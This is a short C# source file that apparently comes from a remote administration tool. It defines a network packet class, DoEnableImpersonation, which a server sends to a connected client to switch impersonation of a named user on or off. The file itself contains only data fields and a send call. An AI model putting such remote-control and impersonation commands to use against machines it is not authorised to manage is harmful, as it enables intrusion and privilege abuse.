using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoEnableImpersonation : IPacket
    {
        public bool impersonate { get; set; }
        public string user { get; set; }

        public DoEnableImpersonation()
        {

        }
        public DoEnableImpersonation(bool impersonate, string user)
        {
            this.impersonate = impersonate;
            this.user = user;

        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
